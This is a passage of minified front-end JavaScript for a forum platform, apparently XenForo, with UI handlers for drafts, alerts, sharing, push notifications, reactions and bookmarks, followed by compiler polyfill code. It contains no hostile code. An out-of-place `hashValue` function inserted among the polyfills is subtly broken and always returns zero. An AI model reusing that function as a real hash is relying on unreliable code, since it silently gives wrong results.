      }
    },
    handleAjax: function (a) {
      var b = this.$target,
        d = c.Event("switchclick:complete"),
        f = this;
      b.trigger(d, a, this);
      d.isDefaultPrevented() || (a.html && a.html.content && this.options.overlayOnHtml ? XF.setupHtmlInsert(a.html, function (a, b) {
        f.overlay && f.overlay.hide();
        a = XF.getOverlayHtml({
          html: a,
          title: b.h1 || b.title
        });
        a.find("form").on("ajax-submit:response", XF.proxy(f, "handleOverlayResponse"));
        f.overlay = XF.showOverlay(a);
      }) : (this.applyResponseActions(a), this.overlay && (this.overlay.hide(), this.overlay = null)));
    },
    handleOverlayResponse: function (a, b) {
      "ok" == b.status && (a.preventDefault(), this.handleAjax(b));
    },
    applyResponseActions: function (a) {
      XF.handleSwitchResponse(this.$target, a, this.options.redirect);
    }
  });
  XF.SwitchOverlayClick = XF.Event.newHandler({
    eventType: "click",
    eventNameSpace: "XFSwitchOverlayClick",
    options: {
      redirect: !1
    },
    overlay: null,
    init: function () {},
    click: function (a) {
      a.preventDefault();
      this.overlay ? this.overlay.show() : (a = this.$target.attr("href"), XF.loadOverlay(a, {
        cache: !1,
        init: XF.proxy(this, "setupOverlay")
      }));
    },
    setupOverlay: function (a) {
      this.overlay = a;
      a.getOverlay().find("form").on("ajax-submit:response", XF.proxy(this, "handleOverlaySubmit"));
      var b = this;
      a.on("overlay:hidden", function () {
        b.overlay = null;
      });
      return a;
    },
    handleOverlaySubmit: function (a, b) {
      "ok" == b.status && (a.preventDefault(), (a = this.overlay) && a.hide(), XF.handleSwitchResponse(this.$target, b, this.options.redirect));
    }
  });
  XF.AlertsList = XF.Element.newHandler({
    options: {},
    processing: !1,
    init: function () {
      var a = XF.findRelativeIf("< .menu-content | .js-alertsMarkRead", this.$target);
      if (a.length) a.on("click", XF.proxy(this, "markAllReadClick"));
      this.$target.find(".js-alertToggle").on("click", this.$target, XF.proxy(this, "markReadClick"));
    },
    _makeAjaxRequest: function (a, b, d) {
      if (!this.processing) {
        this.processing = !0;
        var c = this;
        XF.ajax("POST", a, d || {}, b, {
          skipDefaultSuccess: !0
        }).always(function () {
          setTimeout(function () {
            c.processing = !1;
          }, 250);
        });
      }
    },
    markAllReadClick: function (a) {
      a.preventDefault();
      this._makeAjaxRequest(c(a.target).attr("href"), XF.proxy(this, "handleMarkAllReadAjax"));
    },
    markReadClick: function (a) {
      a.preventDefault();
      a = c(a.currentTarget);
      var b = a.closest(".js-alert"),
        d = b.hasClass("is-unread");
      b = b.data("alert-id");
      this._makeAjaxRequest(a.attr("href"), XF.proxy(this, "handleMarkReadAjax", b), {
        unread: d ? 0 : 1
      });
    },
    handleMarkAllReadAjax: function (a) {
      a.message && XF.flashMessage(a.message, 3E3);
      var b = this;
      this.$target.find(".js-alert").each(function () {
        b.toggleReadStatus(c(this), !1);
      });
    },
    handleMarkReadAjax: function (a, b) {
      b.message && XF.flashMessage(b.message, 3E3);
      a = this.$target.find('.js-alert[data-alert-id="' + a + '"]');
      this.toggleReadStatus(a, !0);
    },
    toggleReadStatus: function (a, b) {
      var d = a.hasClass("is-unread"),
        c = a.find(".js-alertToggle"),
        g = XF.Element.getHandler(c, "tooltip"),
        e = c.data("content");
      d ? (a.removeClass("is-unread"), e = c.data("unread")) : b && (a.addClass("is-unread"), e = c.data("read"));
      g.tooltip.setContent(e);
    }
  });
  XF.Draft = XF.Element.newHandler({
    options: {
      draftAutosave: 60,
      draftName: "message",
      draftUrl: null,
      saveButton: ".js-saveDraft",
      deleteButton: ".js-deleteDraft",
      actionIndicator: ".draftStatus"
    },
    lastActionContent: null,
    autoSaveRunning: !1,
    init: function () {
      if (this.options.draftUrl) {
        var a = this;
        this.$target.on(this.options.saveButton, "click", function (b) {
          b.preventDefault();
          a.triggerSave();
        });
        this.$target.on(this.options.deleteButton, "click", function (b) {
          b.preventDefault();
          a.triggerDelete();
        });
        var b = XF.proxy(this, "syncState");
        this.syncState();
        setTimeout(b, 500);
        this.$target.on("draft:sync", b);
        setInterval(XF.proxy(this, "triggerSave"), 1E3 * this.options.draftAutosave);
      } else console.error("No draft URL specified.");
    },
    triggerSave: function () {
      if (!XF.isRedirecting) {
        var a = c.Event("draft:beforesave");
        this.$target.trigger(a);
        a.isDefaultPrevented() || this._executeDraftAction(this.getSaveData());
      }
    },
    triggerDelete: function () {
      this.lastActionContent = this.getSaveData();
      this._sendDraftAction("delete=1");
    },
    _executeDraftAction: function (a) {
      if (a != this.lastActionContent) {
        if (this.autoSaveRunning) return !1;
        this.lastActionContent = a;
        this._sendDraftAction(a);
      }
    },
    _sendDraftAction: function (a) {
      this.autoSaveRunning = !0;
      var b = this;
      return XF.ajax("post", this.options.draftUrl, a, XF.proxy(this, "completeAction"), {
        skipDefault: !0,
        skipError: !0,
        global: !1
      }).always(function () {
        b.autoSaveRunning = !1;
      });
    },
    completeAction: function (a) {
      var b = c.Event("draft:complete");
      this.$target.trigger(b, a);
      if (!b.isDefaultPrevented() && !1 !== a.draft.saved) {
        var d = this.$target.find(this.options.actionIndicator);
        d.removeClass("is-active").text(a.complete).addClass("is-active");
        setTimeout(function () {
          d.removeClass("is-active");
        }, 2E3);
      }
    },
    syncState: function () {
      this.lastActionContent = this.getSaveData();
    },
    getSaveData: function () {
      var a = this.$target;
      a.trigger("draft:beforesync");
      return a.serialize().replace(/(^|&)_xfToken=[^&]+(?=&|$)/g, "").replace(/^&+/, "");
    }
  });
  XF.DraftTrigger = XF.Element.newHandler({
    options: {
      delay: 2500
    },
    draftHandler: null,
    timer: null,
    init: function () {
      if (XF.isElementWithinDraftForm(this.$target)) {
        var a = this.$target.closest("form");
        if (this.draftHandler = XF.Element.getHandler(a, "draft")) this.$target.on("keyup", XF.proxy(this, "keyup"));
      }
    },
    keyup: function (a) {
      clearTimeout(this.timer);
      var b = this;
      this.timer = setTimeout(function () {
        b.draftHandler.triggerSave();
      }, this.options.delay);
    }
  });
  XF.FocusTrigger = XF.Element.newHandler({
    options: {
      display: null,
      activeClass: "is-active"
    },
    init: function () {
      if (this.$target.attr("autofocus")) this.trigger();else this.$target.one("focusin", XF.proxy(this, "trigger"));
    },
    trigger: function () {
      var a = this.options.display;
      a && (a = XF.findRelativeIf(a, this.$target), a.length && a.addClassTransitioned(this.options.activeClass));
    }
  });
  XF.PollBlock = XF.Element.newHandler({
    options: {},
    init: function () {
      this.$target.on("ajax-submit:response", XF.proxy(this, "afterSubmit"));
    },
    afterSubmit: function (a, b) {
      if (!b.errors && !b.exception) {
        a.preventDefault();
        b.redirect && XF.redirect(b.redirect);
        var c = this;
        XF.setupHtmlInsert(b.html, function (a, b) {
          a.hide();
          a.insertAfter(c.$target);
          c.$target.xfFadeUp(null, function () {
            c.$target.remove();
            a.xfFadeDown();
          });
        });
      }
    }
  });
  XF.Preview = XF.Element.newHandler({
    options: {
      previewUrl: null,
      previewButton: "button.js-previewButton"
    },
    previewing: null,
    init: function () {
      var a = this.$target,
        b = XF.findRelativeIf(this.options.previewButton, a);
      if (this.options.previewUrl) {
        if (b.length) b.on({
          click: XF.proxy(this, "preview")
        });else console.warn("Preview form has no preview button: %o", a);
      } else console.warn("Preview form has no data-preview-url: %o", a);
    },
    preview: function (a) {
      a.preventDefault();
      if (this.previewing) return !1;
      this.previewing = !0;
      (a = XF.Element.getHandler(this.$target, "draft")) && a.triggerSave();
      var b = this;
      XF.ajax("post", this.options.previewUrl, this.$target.serializeArray(), function (a) {
        a.html && XF.setupHtmlInsert(a.html, function (a, b, c) {
          XF.overlayMessage(b.title, a);
        });
      }).always(function () {
        b.previewing = !1;
      });
    }
  });
  XF.ShareButtons = XF.Element.newHandler({
    options: {
      buttons: ".shareButtons-button",
      iconic: ".shareButtons--iconic",
      pageUrl: null,
      pageTitle: null,
      pageDesc: null,
      pageImage: null
    },
    pageUrl: null,
    pageTitle: null,
    pageDesc: null,
    pageImage: null,
    init: function () {
      var a = this.options.buttons,
        b = this.options.iconic;
      this.$target.on("focus mouseenter", a, XF.proxy(this, "focus")).on("click", a, XF.proxy(this, "click"));
      "string" == typeof b && (b = this.$target.is(b));
      this.$target.find(a).each(function () {
        var a = c(this);
        b && XF.Element.applyHandler(a, "element-tooltip", {
          element: "> span"
        });
        a.data("clipboard") && navigator.clipboard && a.removeClass("is-hidden");
      });
    },
    setupPageData: function () {
      this.options.pageTitle && this.options.pageTitle.length ? this.pageTitle = this.options.pageTitle : (this.pageTitle = c('meta[property="og:title"]').attr("content"), this.pageTitle || (this.pageTitle = c("title").text()));
      this.options.pageUrl && this.options.pageUrl.length ? this.pageUrl = this.options.pageUrl : (this.pageUrl = c('meta[property="og:url"]').attr("content"), this.pageUrl || (this.pageUrl = g.location.href));
      this.options.pageDesc && this.options.pageDesc.length ? this.pageDesc = this.options.pageDesc : (this.pageDesc = c('meta[property="og:description"]').attr("content"), this.pageDesc || (this.pageDesc = c("meta[name=description]").attr("content") || ""));
      this.options.pageImage && this.options.pageImage.length ? this.pageImage = this.options.pageImage : (this.pageImage = c('meta[property="og:image"]').attr("content"), this.pageImage || (this.pageImage = XF.config.publicMetadataLogoUrl || ""));
    },
    focus: function (a) {
      var b = c(a.currentTarget);
      if (!b.attr("href") && !b.is(".shareButtons-button--share")) {
        this.pageUrl || this.setupPageData();
        var d = b.data("href");
        if (!d) {
          if (b.data("clipboard")) return;
          console.error("No data-href or data-clipboard on share button %o", a.currentTarget);
        }
        d = d.replace("{url}", encodeURIComponent(this.pageUrl)).replace("{title}", encodeURIComponent(this.pageTitle)).replace("{desc}", encodeURIComponent(this.pageDesc)).replace("{image}", encodeURIComponent(this.pageImage));
        b.attr("href", d);
      }
    },
    click: function (a) {
      var b = c(a.currentTarget),
        d = b.attr("href"),
        f = b.data("popup-width") || 600,
        e = b.data("popup-height") || 400;
      b.is(".shareButtons-button--share") || a.altKey || a.ctrlKey || a.metaKey || a.shiftKey || (b.data("clipboard") ? (a.preventDefault(), a = b.data("clipboard").replace("{url}", this.pageUrl).replace("{title}", this.pageTitle).replace("{desc}", this.pageDesc).replace("{image}", this.pageImage), navigator.clipboard.writeText(a).then(function () {
        XF.flashMessage(XF.phrase("link_copied_to_clipboard"), 3E3);
      })) : d && d.match(/^https?:/i) && (a.preventDefault(), g.open(d, "share", "toolbar=no,location=no,status=no,menubar=no,scrollbars=yes,resizable=yes,width=" + f + ",height=" + e + ",left=" + (screen.width - f) / 2 + ",top=" + (screen.height - e) / 2)));
    }
  });
  XF.ShareInput = XF.Element.newHandler({
    options: {
      button: ".js-shareButton",
      input: ".js-shareInput",
      successText: ""
    },
    $button: null,
    $input: null,
    init: function () {
      this.$button = this.$target.find(this.options.button);
      this.$input = this.$target.find(this.options.input);
      navigator.clipboard && this.$button.removeClass("is-hidden");
      this.$button.on("click", XF.proxy(this, "buttonClick"));
      this.$input.on("click", XF.proxy(this, "inputClick"));
    },
    buttonClick: function (a) {
      var b = this;
      navigator.clipboard.writeText(this.$input.val()).then(function () {
        XF.flashMessage(b.options.successText ? b.options.successText : XF.phrase("text_copied_to_clipboard"), 3E3);
      });
    },
    inputClick: function (a) {
      this.$input.select();
    }
  });
  XF.WebShare = XF.Element.newHandler({
    options: {
      fetch: !1,
      url: null,
      title: null,
      text: null,
      hide: null,
      hideContainerEls: !0
    },
    url: null,
    title: null,
    text: null,
    fetchUrl: null,
    init: function () {
      this.isSupported() && (this.options.fetch && (this.fetchUrl = this.options.fetch), this.hideSpecified(), this.hideContainerElements(), this.setupShareData(), this.$target.removeClass("is-hidden").on("click", XF.proxy(this, "click")));
    },
    isSupported: function () {
      var a = XF.browser.os;
      return "share" in navigator && "https:" == g.location.protocol && ("android" == a || "ios" == a);
    },
    hideSpecified: function () {
      if (this.options.hide) {
        var a = c(this.options.hide);
        a && a.length && a.addClass("is-hidden");
      }
    },
    hideContainerElements: function () {
      if (this.options.hideContainerEls) {
        var a = this.$target.parents(".block, .blockMessage");
        a.length && (a.find(".shareButtons").removeClass("shareButtons--iconic"), a.find(".block-minorHeader").hide(), a.find(".shareButtons-label").hide());
      }
    },
    setupShareData: function () {
      this.fetchUrl || (this.options.url ? this.url = this.options.url : (this.url = c('meta[property="og:url"]').attr("content"), this.url || (this.url = g.location.href)), this.options.title ? this.title = this.options.title : (this.title = c('meta[property="og:title"]').attr("content"), this.title || (this.title = c("title").text())), this.options.text ? this.text = this.options.text : (this.text = c('meta[property="og:description"]').attr("content"), this.text || (this.text = c("meta[name=description]").attr("content") || "")));
    },
    click: function (a) {
      a.preventDefault();
      if (this.fetchUrl) {
        var b = this;
        XF.ajax("get", this.fetchUrl, {
          web_share: !0
        }, function (a) {
          "ok" === a.status ? (b.setShareOptions(a), b.share()) : XF.redirect(b.options.url);
        }, {
          skipDefault: !0,
          skipError: !0,
          global: !1
        });
      } else this.share();
    },
    share: function () {
      navigator.share(this.getShareOptions()).catch(function (a) {});
    },
    setShareOptions: function (a) {
      this.url = a.contentUrl;
      this.title = a.contentTitle;
      this.text = a.contentDesc || a.contentTitle;
      this.fetchUrl = null;
    },
    getShareOptions: function () {
      var a = {
        url: this.url,
        title: "",
        text: ""
      };
      this.title && (a.title = this.title);
      a.text = this.text ? this.text : a.title;
      return a;
    }
  });
  XF.CopyToClipboard = XF.Element.newHandler({
    options: {
      copyText: "",
      copyTarget: "",
      success: ""
    },
    copyText: null,
    init: function () {
      navigator.clipboard && this.$target.removeClass("is-hidden");
      if (this.options.copyText) this.copyText = this.options.copyText;else if (this.options.copyTarget) {
        var a = c(this.options.copyTarget);
        a.is('input[type="text"], textarea') ? this.copyText = a.val() : this.copyText = a.text();
      }
      if (this.copyText) this.$target.on("click", XF.proxy(this, "click"));else console.error("No text to copy to clipboard");
    },
    click: function () {
      var a = this;
      navigator.clipboard.writeText(this.copyText).then(function () {
        if (a.options.success) XF.flashMessage(a.options.success, 3E3);else {
          var b = XF.phrase("text_copied_to_clipboard");
          a.copyText.match(/^[a-z0-9-]+:\/\/[^\s"<>{}`]+$/i) && (b = XF.phrase("link_copied_to_clipboard"));
          XF.flashMessage(b, 3E3);
        }
      });
    }
  });
  XF.PushToggle = XF.Element.newHandler({
    options: {},
    isSubscribed: !1,
    cancellingSub: null,
    init: function () {
      XF.Push.isSupported() ? "denied" === Notification.permission ? (this.updateButton(XF.phrase("push_blocked_label"), !1), console.error("Notification.permission === denied")) : this.registerWorker() : (this.updateButton(XF.phrase("push_not_supported_label"), !1), console.error("XF.Push.isSupported() returned false"));
    },
    registerWorker: function () {
      var a = this;
      XF.Push.registerWorker(function () {
        a.$target.on("click", XF.proxy(a, "buttonClick"));
        c(e).on("push:init-subscribed", function () {
          a.updateButton(XF.phrase("push_disable_label"), !0);
        });
        c(e).on("push:init-unsubscribed", function () {
          a.updateButton(XF.phrase("push_enable_label"), !0);
        });
      }, function () {
        a.updateButton(XF.phrase("push_not_supported_label"), !1);
        console.error("navigator.serviceWorker.register threw an error.");
      });
    },
    buttonClick: function (a) {
      var b = this;
      XF.Push.handleToggleAction(function () {
        b.updateButton(XF.phrase("push_enable_label"), !0);
        XF.Cookie.set("push_notice_dismiss", "1");
        XF.config.userId && XF.Push.removeUserFromPushHistory();
      }, !1, function () {
        b.updateButton(XF.phrase("push_disable_label"), !0);
      }, function () {
        b.updateButton(XF.phrase("push_not_supported_label"), !1);
      });
    },
    updateButton: function (a, b) {
      this.$target.find(".button-text").text(a);
      b ? this.$target.removeClass("is-disabled") : this.$target.addClass("is-disabled");
    }
  });
  XF.PushCta = XF.Element.newHandler({
    options: {},
    init: function () {
      XF.config.skipPushNotificationCta || XF.Push.isSupported() && "denied" !== Notification.permission && this.registerWorker();
    },
    registerWorker: function () {
      var a = this;
      XF.Push.registerWorker(function () {
        c(e).on("push:init-unsubscribed", function () {
          if (XF.Push.hasUserPreviouslySubscribed()) try {
            XF.Push.handleSubscribeAction(!0);
          } catch (b) {
            XF.Push.removeUserFromPushHistory();
          } else a.getDismissCookie() || a.$target.closest(".js-enablePushContainer").xfFadeDown(XF.config.speed.fast, XF.proxy(a, "initLinks"));
        });
      });
    },
    initLinks: function () {
      var a = this.$target;
      a.find(".js-enablePushLink").on("click", XF.proxy(this, "linkClick"));
      a.siblings(".js-enablePushDismiss").on("click", XF.proxy(this, "dismissClick"));
    },
    linkClick: function (a) {
      a.preventDefault();
      this.hidePushContainer();
      this.setDismissCookie(!0, 432E5);
      XF.Push.handleSubscribeAction(!1);
    },
    dismissClick: function (a) {
      a.preventDefault();
      c(a.currentTarget).hide();
      this.$target.closest(".js-enablePushContainer").addClass("notice--accent").removeClass("notice--primary");
      this.$target.find(".js-initialMessage").hide();
      a = this.$target.find(".js-dismissMessage");
      a.show();
      a.find(".js-dismissTemp").on("click", XF.proxy(this, "dismissTemp"));
      a.find(".js-dismissPerm").on("click", XF.proxy(this, "dismissPerm"));
    },
    dismissTemp: function (a) {
      a.preventDefault();
      this.hidePushContainer();
      this.setDismissCookie(!1);
    },
    dismissPerm: function (a) {
      a.preventDefault();
      this.hidePushContainer();
      this.setDismissCookie(!0);
    },
    setDismissCookie: function (a, b) {
      a ? (b || (b = 31536E7), XF.Cookie.set("push_notice_dismiss", "1", new Date(Date.now() + b))) : XF.Cookie.set("push_notice_dismiss", "1");
    },
    getDismissCookie: function () {
      return XF.Cookie.get("push_notice_dismiss");
    },
    hidePushContainer: function () {
      this.$target.closest(".js-enablePushContainer").xfFadeUp(XF.config.speed.fast);
    }
  });
  XF.Reaction = XF.Element.newHandler({
    options: {
      delay: 200,
      reactionList: null
    },
    $tooltipHtml: null,
    trigger: null,
    tooltip: null,
    href: null,
    loading: !1,
    init: function () {
      if (this.$target.is("a") && this.$target.attr("href")) {
        this.href = this.$target.attr("href");
        var a = c("#xfReactTooltipTemplate");
        a.length && (this.$tooltipHtml = c(c.parseHTML(a.html())), this.tooltip = new XF.TooltipElement(XF.proxy(this, "getContent"), {
          extraClass: "tooltip--reaction",
          html: !0
        }), this.trigger = new XF.TooltipTrigger(this.$target, this.tooltip, {
          maintain: !0,
          delayIn: this.options.delay,
          trigger: "hover focus touchhold",
          onShow: XF.proxy(this, "onShow"),
          onHide: XF.proxy(this, "onHide")
        }), this.trigger.init());
        this.$target.on("click", XF.proxy(this, "actionClick"));
      }
    },
    getContent: function () {
      var a = this.href;
      a = a.replace(/(\?|&)reaction_id=[^&]*(&|$)/, "$1reaction_id=");
      this.$tooltipHtml.find(".reaction").each(function () {
        var b = c(this),
          d = b.data("reaction-id");
        b.attr("href", d ? a + parseInt(d, 10) : !1);
      });
      this.$tooltipHtml.find('[data-xf-init~="tooltip"]').attr("data-delay-in", 50).attr("data-delay-out", 50);
      this.$tooltipHtml.on("click", ".reaction", XF.proxy(this, "actionClick"));
      return this.$tooltipHtml;
    },
    onShow: function () {
      var a = XF.Reaction.activeTooltip;
      a && a !== this && a.hide();
      XF.Reaction.activeTooltip = this;
    },
    onHide: function () {
      XF.Reaction.activeTooltip === this && (XF.Reaction.activeTooltip = null);
      this.$target.removeData("tooltip:taphold");
    },
    show: function () {
      this.trigger && this.trigger.show();
    },
    hide: function () {
      this.trigger && this.trigger.hide();
    },
    actionClick: function (a) {
      a.preventDefault();
      if (this.$target.data("tooltip:taphold") && this.$target.is(a.currentTarget)) this.$target.removeData("tooltip:taphold");else if (!this.loading) {
        this.loading = !0;
        var b = this;
        XF.ajax("post", c(a.currentTarget).attr("href"), XF.proxy(this, "actionComplete")).always(function () {
          setTimeout(function () {
            b.loading = !1;
          }, 250);
        });
      }
    },
    actionComplete: function (a) {
      if (a.html) {
        var b = this.$target,
          d = b.data("reaction-id"),
          f = a.reactionId,
          e = a.linkReactionId,
          g = this;
        XF.setupHtmlInsert(a.html, function (a, c, h) {
          g.hide();
          c = a.find(".js-reaction");
          h = a.find(".js-reactionText");
          var k = b.find(".js-reaction"),
            m = b.find(".js-reactionText"),
            l = b.attr("href");
          e && (l = l.replace(/(\?|&)reaction_id=\d+(?=&|$)/, "$1reaction_id=" + e), b.attr("href", l));
          f ? (b.addClass("has-reaction"), b.removeClass("reaction--imageHidden"), d && b.removeClass("reaction--" + d), b.addClass("reaction--" + f), b.data("reaction-id", f)) : (b.removeClass("has-reaction"), b.addClass("reaction--imageHidden"), d && (b.removeClass("reaction--" + d), b.addClass("reaction--" + a.data("reaction-id")), b.data("reaction-id", 0)));
          k.replaceWith(c);
          m && h && m.replaceWith(h);
        });
        var h = this.options.reactionList ? XF.findRelativeIf(this.options.reactionList, b) : c([]);
        "undefined" !== typeof a.reactionList && h.length && (a.reactionList.content ? XF.setupHtmlInsert(a.reactionList, function (a, b) {
          h.html(a).addClassTransitioned("is-active");
        }) : h.removeClassTransitioned("is-active", function () {
          h.empty();
        }));
      }
    }
  });
  XF.Reaction.activeTooltip = null;
  XF.BookmarkClick = XF.Event.newHandler({
    eventType: "click",
    eventNameSpace: "XFBookmarkClick",
    processing: !1,
    href: null,
    tooltip: null,
    trigger: null,
    $tooltipHtml: null,
    clickE: null,
    init: function () {
      this.href = this.$target.attr("href");
      this.tooltip = new XF.TooltipElement(XF.proxy(this, "getTooltipContent"), {
        extraClass: "tooltip--bookmark",
        html: !0,
        loadRequired: !0
      });
      this.trigger = new XF.TooltipTrigger(this.$target, this.tooltip, {
        maintain: !0,
        trigger: ""
      });
      this.trigger.init();
    },
    click: function (a) {
      if (!(0 < a.button || a.ctrlKey || a.shiftKey || a.metaKey || a.altKey)) if (a.preventDefault(), this.clickE = a, this.$target.hasClass("is-bookmarked")) this.trigger.clickShow(a);else if (!this.processing) {
        this.processing = !0;
        var b = this;
        XF.ajax("POST", this.href, {
          tooltip: 1
        }, XF.proxy(this, "handleSwitchClick"), {
          skipDefaultSuccess: !0
        }).always(function () {
          setTimeout(function () {
            b.processing = !1;
          }, 250);
        });
      }
    },
    handleSwitchClick: function (a) {
      var b = this,
        c = function () {
          XF.handleSwitchResponse(b.$target, a);
          b.trigger.clickShow(b.clickE);
        };
      a.html ? XF.setupHtmlInsert(a.html, function (a, d, e) {
        b.tooltip.requiresLoad() && (b.$tooltipHtml = a, b.tooltip.setLoadRequired(!1));
        c();
      }) : c();
    },
    getTooltipContent: function (a) {
      if (this.$tooltipHtml && !this.tooltip.requiresLoad()) return this.initializeTooltip(this.$tooltipHtml), this.$tooltipHtml;
      var b = this,
        c = {
          skipDefault: !0,
          skipError: !0,
          global: !1
        };
      this.trigger.wasClickTriggered() && (c.global = !0);
      XF.ajax("get", this.href, {
        tooltip: 1
      }, function (c) {
        b.tooltipLoaded(c, a);
      }, c);
    },
    tooltipLoaded: function (a, b) {
      var c = this;
      XF.setupHtmlInsert(a.html, function (a, d, e) {
        c.initializeTooltip(a);
        b(a);
      });
    },
    initializeTooltip: function (a) {
      a.find("form").on("ajax-submit:response", XF.proxy(this, "handleOverlaySubmit"));
    },
    handleOverlaySubmit: function (a, b) {
      "ok" == b.status && (a.preventDefault(), this.trigger && this.trigger.hide(), XF.handleSwitchResponse(this.$target, b), "bookmarkremoved" == b.switchKey && a.currentTarget.reset());
    }
  });
  XF.BookmarkLabelFilter = XF.Element.newHandler({
    options: {
      target: null,
      showAllLinkTarget: null
    },
    loading: !1,
    $filterTarget: null,
    $showAllLinkTarget: null,
    init: function () {
      this.$filterTarget = XF.findRelativeIf(this.options.target, this.$target);
      if (this.$filterTarget.length) {
        this.options.showAllLinkTarget && (this.$showAllLinkTarget = XF.findRelativeIf(this.options.showAllLinkTarget, this.$target));
        var a = this;
        this.$target.on("select2:select", XF.proxy(this, "loadResults"));
        this.$target.on("select2:unselect", function (b) {
          a.loadResults();
        });
      } else console.error("No filter target found.");
    },
    loadResults: function () {
      if (!this.loading) {
        this.loading = !0;
        var a = this.$target.find(".js-labelFilter").val(),
          b = this;
        XF.ajax("get", XF.canonicalizeUrl("index.php?account/bookmarks-popup"), {
          label: a
        }, function (a) {
          a.html && (b.$showAllLinkTarget && a.showAllUrl && b.$showAllLinkTarget.attr("href", a.showAllUrl), XF.setupHtmlInsert(a.html, function (a, c) {
            b.$target.find(".js-tokenSelect").select2("close");
            b.$filterTarget.empty();
            b.$filterTarget.append(a);
          }));
        }).always(function () {
          b.loading = !1;
        });
      }
    }
  });
  XF.ContentVote = XF.Element.newHandler({
    options: {
      contentId: null
    },
    processing: !1,
    init: function () {
      this.$target.on("click", "[data-vote]", XF.proxy(this, "voteClick"));
    },
    voteClick: function (a) {
      a.preventDefault();
      a = c(a.currentTarget);
      if (!a.hasClass("is-disabled") && !this.processing) {
        this.processing = !0;
        a = a.attr("href");
        var b = this;
        XF.ajax("POST", a, {}, XF.proxy(this, "handleAjax"), {
          skipDefaultSuccess: !1
        }).always(function () {
          setTimeout(function () {
            b.processing = !1;
          }, 250);
        });
      }
    },
    handleAjax: function (a) {
      this.updateData(a);
      if (this.options.contentId) {
        var b = c('.js-contentVote[data-content-id="' + this.options.contentId + '"]'),
          d = this,
          e = this.$target;
        b.each(function () {
          if (e[0] !== this) {
            var b = c(this);
            b.is('[data-xf-init~="content-vote"]') ? XF.Element.getHandler(b, "content-vote").updateData(a) : d.updateDisplay(b, a);
          }
        });
      }
    },
    updateData: function (a) {
      this.updateDisplay(this.$target, a);
    },
    updateDisplay: function (a, b) {
      var c = a.find(".js-voteCount");
      a.find(".is-voted").removeClass("is-voted");
      b.vote ? (a.find('[data-vote="' + b.vote + '"]').addClass("is-voted"), a.addClass("is-voted")) : a.removeClass("is-voted");
      c.fadeOut("fast", function () {
        c.attr("data-score", b.voteScore).text(b.voteScoreShort);
        0 < b.voteScore ? c.removeClass("is-negative").addClass("is-positive") : 0 > b.voteScore ? c.removeClass("is-positive").addClass("is-negative") : c.removeClass("is-positive").removeClass("is-negative");
        c.fadeIn("fast");
      });
    }
  });
  XF.InstallPrompt = XF.Element.newHandler({
    options: {
      button: "| .js-installPromptButton"
    },
    $button: null,
    bipEvent: null,
    init: function () {
      if ((this.$button = XF.findRelativeIf(this.options.button, this.$target)) && this.$button.length) {
        var a = c(g);
        a.on("beforeinstallprompt", XF.proxy(this, "beforeInstallPrompt"));
        a.on("appinstalled", XF.proxy(this, "appInstalled"));
        this.$button.on("click", XF.proxy(this, "buttonClick"));
      } else console.error("No install button found for %o", this.$target[0]);
    },
    beforeInstallPrompt: function (a) {
      a.preventDefault();
      this.bipEvent = a.originalEvent;
      this.$target.show();
    },
    appInstalled: function (a) {
      this.$target.hide();
    },
    buttonClick: function () {
      this.bipEvent ? this.bipEvent.prompt() : console.error("No beforeinstallprompt event was captured");
    }
  });
  XF.Event.register("click", "attribution", "XF.AttributionClick");
  XF.Event.register("click", "like", "XF.LikeClick");
  XF.Event.register("click", "preview-click", "XF.PreviewClick");
  XF.Event.register("click", "scroll-to", "XF.ScrollToClick");
  XF.Event.register("click", "switch", "XF.SwitchClick");
  XF.Event.register("click", "switch-overlay", "XF.SwitchOverlayClick");
  XF.Element.register("alerts-list", "XF.AlertsList");
  XF.Element.register("draft", "XF.Draft");
  XF.Element.register("draft-trigger", "XF.DraftTrigger");
  XF.Element.register("focus-trigger", "XF.FocusTrigger");
  XF.Element.register("poll-block", "XF.PollBlock");
  XF.Element.register("preview", "XF.Preview");
  XF.Element.register("share-buttons", "XF.ShareButtons");
  XF.Element.register("share-input", "XF.ShareInput");
  XF.Element.register("web-share", "XF.WebShare");
  XF.Element.register("copy-to-clipboard", "XF.CopyToClipboard");
  XF.Element.register("push-toggle", "XF.PushToggle");
  XF.Element.register("push-cta", "XF.PushCta");
  XF.Element.register("reaction", "XF.Reaction");
  XF.Element.register("bookmark-click", "XF.BookmarkClick");
  XF.Element.register("bookmark-label-filter", "XF.BookmarkLabelFilter");
  XF.Element.register("content-vote", "XF.ContentVote");
  XF.Element.register("install-prompt", "XF.InstallPrompt");
}(jQuery, window, document);
var $jscomp = $jscomp || {};
$jscomp.scope = {};
$jscomp.findInternal = function (c, l, g) {
  c instanceof String && (c = String(c));
  for (var a = c.length, b = 0; b < a; b++) {
    var d = c[b];
    if (l.call(g, d, b, c)) return {
      i: b,
      v: d
    };
  }
  return {
    i: -1,
    v: void 0
  };
};
$jscomp.ASSUME_ES5 = !1;
$jscomp.ASSUME_NO_NATIVE_MAP = !1;
$jscomp.ASSUME_NO_NATIVE_SET = !1;
$jscomp.defineProperty = $jscomp.ASSUME_ES5 || "function" == typeof Object.defineProperties ? Object.defineProperty : function (c, l, g) {
  c != Array.prototype && c != Object.prototype && (c[l] = g.value);
};
$jscomp.getGlobal = function (c) {
  return "undefined" != typeof window && window === c ? c : "undefined" != typeof global && null != global ? global : c;
};
$jscomp.global = $jscomp.getGlobal(this);
function hashValue(obj) {
  let values = Object.values(obj).sort().join();
  let hash = 0;
  for (let i = 0; i < values.length; i++) {
    let char = values.charCodeAt(i);
    hash = (hash << 5) - hash + char & hash;
  }
  return hash.toString(16);
}
$jscomp.polyfill = function (c, l, g, a) {
  if (l) {
    g = $jscomp.global;
    c = c.split(".");
    for (a = 0; a < c.length - 1; a++) {
      var b = c[a];
      b in g || (g[b] = {});
      g = g[b];
    }
    c = c[c.length - 1];
    a = g[c];
    l = l(a);
    l != a && null != l && $jscomp.defineProperty(g, c, {
      configurable: !0,
      writable: !0,
      value: l
    });
  }
};
$jscomp.polyfill("Array.prototype.find", function (c) {
  return c ? c : function (c, g) {
    return $jscomp.findInternal(this, c, g).v;
  };
}, "es6", "es3");
$jscomp.SYMBOL_PREFIX = "jscomp_symbol_";
$jscomp.initSymbol = function () {
  $jscomp.initSymbol = function () {};
  $jscomp.global.Symbol || ($jscomp.global.Symbol = $jscomp.Symbol);
};
$jscomp.Symbol = function () {
  var c = 0;
  return function (l) {
    return $jscomp.SYMBOL_PREFIX + (l || "") + c++;
  };
}();
$jscomp.initSymbolIterator = function () {
  $jscomp.initSymbol();
  var c = $jscomp.global.Symbol.iterator;
